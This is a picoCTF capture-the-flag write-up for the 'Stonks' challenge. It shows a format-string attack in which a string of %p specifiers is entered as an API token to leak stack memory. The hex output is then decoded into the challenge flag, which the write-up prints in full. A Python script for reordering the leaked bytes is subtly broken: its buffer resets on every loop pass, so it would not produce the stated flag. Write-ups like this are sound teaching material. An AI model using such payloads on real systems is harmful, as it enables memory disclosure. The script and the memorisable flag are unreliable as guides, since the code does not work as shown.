I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 33411

Stonks


# Description:

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 33411
Hints

1. Okay, maybe I'd believe you if you find my API key.



# Solution

Connect to the shell with nc mercury.picoctf.net 33411


‘’’
apurva@Deepas-MacBook-Air ~ % nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x98c44700x804b0000x80489c30xf7f08d800xffffffff0x10x98c21600xf7f161100xf7f08dc7(nil)0x98c31800x10x98c44500x98c44700x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xffb9007d
Portfolio as of Sun Dec 8 15:18:23 UTC 2024


1 shares of TA
1 shares of EHBQ
1 shares of PDP
16 shares of YEA
31 shares of A
60 shares of QEW
209 shares of GLU
20 shares of KQM
27 shares of KN
228 shares of NQPR
376 shares of DXOW
869 shares of XWPM
Goodbye!
apurva@Deepas-MacBook-Air ~ % 
‘’’

This part:
0x98c44700x804b0000x80489c30xf7f08d800xffffffff0x10x98c21600xf7f161100xf7f08dc7(nil)0x98c31800x10x98c44500x98c44700x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xffb9007d

looks like hex. I reformatted it in notepad (and also took out everything before (nil) which I guess was padding or something) and jammed it into HxD which gives:
ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41}

it looks like ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41}is the flag except each 4 character block is reversed so I wrote a some code to output the proper flag.
‘’’ 
string = "ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41}" 
out = "" 
temp = "" 
index = 0 
for char in string: 
 temp += char 
 index += 1 
 if index%4 == 0: 
  fwd = "" 
  for temp_char in temp: 
   fwd = temp_char + fwd 
  out += fwd 
 temp = "" 
print(out)
‘’’

# Flag:
> picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
